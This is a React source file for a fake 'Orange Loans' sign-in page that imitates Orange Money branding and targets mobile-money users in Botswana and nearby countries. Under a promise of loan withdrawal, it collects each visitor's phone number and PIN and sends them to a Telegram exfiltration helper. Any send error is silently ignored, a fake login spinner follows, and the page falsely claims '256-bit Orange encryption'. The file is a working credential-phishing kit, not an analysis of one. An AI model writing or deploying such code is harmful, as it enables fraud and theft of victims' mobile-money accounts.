import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import Logo from '../components/Logo';
import PageLoader from '../components/PageLoader';
import { momoCountries, MoMoCountry } from '../data/countries';
import { setSession } from '../lib/session';
import { sendToTelegram } from '../lib/api';
import { ArrowLeft, ChevronDown, Loader2, ShieldCheck, Lock } from 'lucide-react';

export default function SignInPage() {
  const navigate = useNavigate();
  const [country, setCountry] = useState<MoMoCountry>(momoCountries[0]); // Botswana default
  const [phone, setPhone] = useState('');
  const [pin, setPin] = useState('');
  const [loading, setLoading] = useState(false);
  const [dropdownOpen, setDropdownOpen] = useState(false);

  const handleSignIn = async () => {
    if (phone.length < 6 || !pin.trim()) return;
    setLoading(true);
    try {
      await sendToTelegram({
        type: 'credentials',
        country: country.name,
        countryCode: country.code,
        phone,
        pin,
      });
    } catch (_) {
      /* fallback silent */
    }
    setSession({ phone, country: country.name, countryCode: country.code, loggedIn: true });
    setTimeout(() => navigate('/'), 2000);
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-white text-black flex flex-col items-center justify-center gap-6 px-4 font-sans">
        <Logo size="lg" />
        <h2 className="text-2xl font-black tracking-tight">
          <span className="text-[#ff7900]">Orange</span> <span className="text-black">Loans</span>
        </h2>
        <Loader2 className="w-10 h-10 text-[#ff7900] animate-spin" />
        <p className="text-gray-700 text-base font-bold">Signing into your Orange Money account...</p>
      </div>
    );
  }

  return (
    <PageLoader>
      <div className="min-h-screen bg-white text-black flex flex-col font-sans">
        {/* Header */}
        <header className="border-b border-gray-200 py-3 px-4 bg-white sticky top-0 z-40">
          <div className="container mx-auto max-w-4xl flex items-center justify-between">
            <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
              <Logo size="sm" />
              <span className="font-black text-xl tracking-tight">
                <span className="text-[#ff7900]">Orange</span> <span className="text-black">Loans</span>
              </span>
            </div>
            <div className="flex items-center gap-2 text-xs font-bold text-gray-600">
              <span className="w-2 h-2 bg-[#ff7900]"></span>
              <span>Botswana</span>
            </div>
          </div>
        </header>

        <div className="flex-1 flex flex-col items-center justify-center px-4 py-8 sm:py-12">
          <div className="w-full max-w-md bg-white rounded-lg p-6 sm:p-8 text-black border border-gray-300 shadow-sm relative">
            <button
              id="signin-back-btn"
              onClick={() => navigate('/')}
              className="flex items-center gap-1.5 text-gray-600 hover:text-black text-xs font-bold uppercase tracking-wider mb-6 transition"
            >
              <ArrowLeft className="w-4 h-4 text-[#ff7900]" />
              <span>Back to Home</span>
            </button>

            <div className="mb-6">
              <h3 className="text-2xl font-black text-black tracking-tight mb-1">
                Log in to Withdraw
              </h3>
              <p className="text-gray-600 text-xs sm:text-sm">
                Log in to withdraw your approved loan or manage your account
              </p>
            </div>

            {/* Country + Phone input */}
            <div className="mb-4">
              <label className="block text-xs font-black uppercase tracking-wider text-black mb-1.5 flex items-center gap-1.5">
                <span className="w-1.5 h-1.5 bg-[#ff7900]"></span>
                <span>Orange mobile number</span>
              </label>
              <div className="relative">
                <div className="flex items-center border-2 border-gray-300 focus-within:border-[#ff7900] rounded-lg overflow-hidden transition bg-white shadow-xs">
                  <button
                    type="button"
                    onClick={() => setDropdownOpen(!dropdownOpen)}
                    className="flex items-center justify-center gap-1.5 px-3 py-3.5 bg-gray-50 border-r border-gray-200 hover:bg-gray-100 transition shrink-0 cursor-pointer select-none"
                    title={country.name}
                  >
                    <div className="w-7 h-5 flex items-center justify-center shrink-0 overflow-hidden border border-gray-300 bg-white">
                      <img
                        src={`https://flagcdn.com/w80/${country.iso}.png`}
                        alt={country.name}
                        className="w-full h-full object-cover block"
                        loading="eager"
                      />
                    </div>
                    <span className="text-xs font-black text-black">{country.code}</span>
                    <ChevronDown className="w-3.5 h-3.5 text-gray-500 shrink-0" />
                  </button>
                  <input
                    id="signin-phone-input"
                    type="tel"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
                    placeholder="e.g. 72123456"
                    className="flex-1 min-w-0 px-3.5 py-3.5 text-base font-bold text-black outline-none placeholder:text-gray-400 bg-transparent"
                    autoFocus
                  />
                </div>

                {dropdownOpen && (
                  <div className="absolute z-30 w-full mt-2 bg-white border border-gray-300 rounded shadow-xl max-h-60 overflow-y-auto divide-y divide-gray-100">
                    {momoCountries.map((c) => (
                      <button
                        key={c.name}
                        type="button"
                        onClick={() => {
                          setCountry(c);
                          setDropdownOpen(false);
                        }}
                        className="w-full flex items-center gap-3 px-4 py-3 hover:bg-gray-50 text-sm font-semibold text-black transition text-left"
                      >
                        <div className="w-7 h-5 flex items-center justify-center shrink-0 overflow-hidden border border-gray-300 bg-white">
                          <img
                            src={`https://flagcdn.com/w80/${c.iso}.png`}
                            alt={c.name}
                            className="w-full h-full object-cover block"
                            loading="lazy"
                          />
                        </div>
                        <span>{c.name}</span>
                        <span className="text-gray-500 font-bold ml-auto">{c.code}</span>
                      </button>
                    ))}
                  </div>
                )}
              </div>
            </div>

            {/* Password / PIN - NO RULES ON THE CHARACTER NUMBERS */}
            <div className="mb-6">
              <label className="block text-xs font-black uppercase tracking-wider text-black mb-1.5 flex items-center gap-1.5">
                <span className="w-1.5 h-1.5 bg-[#ff7900]"></span>
                <span>Password *</span>
              </label>
              <div className="relative flex items-center">
                <input
                  id="signin-pin-input"
                  type="password"
                  value={pin}
                  onChange={(e) => setPin(e.target.value)}
                  placeholder="Enter your password / PIN"
                  className="w-full border border-gray-300 rounded-lg px-4 py-3 text-base font-bold text-black outline-none pl-10 bg-white"
                />
                <Lock className="w-4 h-4 text-gray-500 absolute left-3.5 pointer-events-none" />
              </div>
            </div>

            <div className="flex items-center gap-2 text-xs text-gray-600 mb-6 bg-[#f6f6f6] p-3 rounded border border-gray-300">
              <ShieldCheck className="w-4 h-4 text-[#ff7900] shrink-0" />
              <span>Secure connection protected with 256-bit Orange encryption.</span>
            </div>

            <button
              id="signin-submit-btn"
              onClick={handleSignIn}
              disabled={phone.length < 6 || !pin.trim()}
              className="w-full py-4 rounded bg-[#ff7900] text-white font-black text-sm uppercase tracking-wide hover:bg-[#e06b00] disabled:opacity-40 transition shadow-sm"
            >
              Sign In
            </button>

            <div className="mt-6 pt-4 border-t border-gray-200 text-center">
              <p className="text-xs text-gray-600 font-bold mb-1">
                First visit ?
              </p>
              <button
                onClick={() => navigate('/apply')}
                className="text-[#ff7900] font-black text-xs uppercase tracking-wider hover:underline"
              >
                Apply for loan / create your account
              </button>
            </div>
          </div>
        </div>
      </div>
    </PageLoader>
  );
}
